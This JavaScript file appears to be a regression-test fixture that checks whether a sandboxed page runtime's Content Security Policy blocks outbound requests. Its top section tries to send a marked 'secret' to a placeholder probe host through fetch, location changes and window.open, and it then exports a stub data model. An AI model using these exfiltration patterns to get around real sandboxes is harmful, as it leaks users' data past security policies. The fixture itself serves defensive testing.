// __PROBE_BASE__ is replaced by the regression script. The logic frame has no
// network permission; CSP must block even this direct browser request.
try {
  fetch("__PROBE_BASE__/service-fetch", { method: "POST", body: "service-bypass" });
} catch {}
setTimeout(() => {
  try { location.href = "__PROBE_BASE__/service-location-href?secret=logic"; } catch {}
  try { location.assign("__PROBE_BASE__/service-location-assign?secret=logic"); } catch {}
  try { location.replace("__PROBE_BASE__/service-location-replace?secret=logic"); } catch {}
  try { window.open("__PROBE_BASE__/service-window-open?secret=logic", "_blank"); } catch {}
}, 50);

export default function create() {
  return {
    getModel() {
      return {
        runtime: "lume.page/v1",
        schema: "lume.collection/v1",
        revision: 1,
        status: "ready",
        data: { items: [], groups: [], total: 0, window: { offset: 0, limit: 1 } },
      };
    },
  };
}
